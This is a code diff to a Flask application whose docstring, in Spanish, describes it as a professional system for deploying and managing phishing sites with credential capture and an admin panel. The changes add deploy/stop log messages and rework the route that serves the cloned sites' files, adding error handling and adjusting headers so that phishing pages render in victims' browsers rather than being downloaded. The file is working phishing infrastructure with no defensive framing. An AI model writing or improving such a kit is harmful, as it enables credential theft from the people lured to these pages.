@@ -10,7 +10,7 @@ Sistema profesional para despliegue y gestión de sitios de phishing
 con captura de credenciales y panel de administración avanzado.
 """
 
-from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify
+from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify, make_response
 import os
 import json
 import datetime
@@ -133,12 +133,14 @@ def deploy_site(site_name):
         return redirect(url_for('index'))
     
     deployed_sites.add(site_name)
+    print(f"✅ Sitio desplegado: {site_name}")
     return redirect(url_for('site_status', site_name=site_name))
 
 @app.route('/stop/<site_name>')
 def stop_site(site_name):
     """Detiene un sitio (lo marca como inactivo)"""
     deployed_sites.discard(site_name)
+    print(f"⛔ Sitio detenido: {site_name}")
     return redirect(url_for('index'))
 
 @app.route('/site-status/<site_name>')
@@ -199,31 +201,39 @@ def serve_phishing_file(site_name, filename):
             actual_ext = parts[-2].lower()
     
     if file_ext in STATIC_FILES or actual_ext in ['js', 'css', 'html']:
-        # Para archivos en subcarpetas, usar send_from_directory con el directorio padre
-        directory = os.path.dirname(file_path)
-        file_name = os.path.basename(file_path)
-        
-        # Configurar headers apropiados según el tipo de archivo
-        response = send_from_directory(directory, file_name)
-        
-        # Headers adicionales para archivos estáticos
-        content_types = {
-            'css': 'text/css; charset=utf-8',
-            'js': 'application/javascript; charset=utf-8',
-            'json': 'application/json; charset=utf-8',
-            'svg': 'image/svg+xml',
-            'woff': 'font/woff',
-            'woff2': 'font/woff2',
-            'ttf': 'font/ttf',
-            'asc': 'text/plain',
-            'download': 'application/octet-stream'
-        }
-        
-        # Usar el tipo real para archivos .download
-        mime_type = content_types.get(actual_ext, content_types.get(file_ext, 'application/octet-stream'))
-        response.headers['Content-Type'] = mime_type
-        
-        return response
+        try:
+            # Para archivos en subcarpetas, usar send_from_directory con el directorio padre
+            directory = os.path.dirname(file_path)
+            file_name = os.path.basename(file_path)
+            
+            # Headers adicionales para archivos estáticos
+            content_types = {
+                'css': 'text/css; charset=utf-8',
+                'js': 'application/javascript; charset=utf-8',
+                'json': 'application/json; charset=utf-8',
+                'svg': 'image/svg+xml',
+                'woff': 'font/woff',
+                'woff2': 'font/woff2',
+                'ttf': 'font/ttf',
+                'asc': 'text/plain',
+                'download': 'application/octet-stream'
+            }
+            
+            # Usar el tipo real para archivos .download
+            mime_type = content_types.get(actual_ext, content_types.get(file_ext, 'application/octet-stream'))
+            
+            # Configurar headers apropiados según el tipo de archivo
+            response = send_from_directory(directory, file_name)
+            response.headers['Content-Type'] = mime_type
+            
+            # Evitar descargas forzadas para archivos web
+            if actual_ext in ['css', 'js', 'html', 'svg']:
+                response.headers.pop('Content-Disposition', None)
+            
+            return response
+        except Exception as e:
+            print(f"Error sirviendo archivo estático {filename}: {e}")
+            return '', 404
     
     # Archivos HTML/PHP/CSS/JS
     try:
@@ -244,7 +254,17 @@ def serve_phishing_file(site_name, filename):
         }
         
         content_type = content_types.get(file_ext, 'text/plain; charset=utf-8')
-        return content, 200, {'Content-Type': content_type}
+        
+        # Crear respuesta con headers apropiados
+        response = make_response(content)
+        response.headers['Content-Type'] = content_type
+        
+        # Evitar que el navegador fuerce la descarga
+        if file_ext in ['html', 'php']:
+            response.headers.pop('Content-Disposition', None)
+            response.headers['X-Content-Type-Options'] = 'nosniff'
+        
+        return response
     
     except Exception as e:
         return f"Error al cargar archivo: {str(e)}", 500
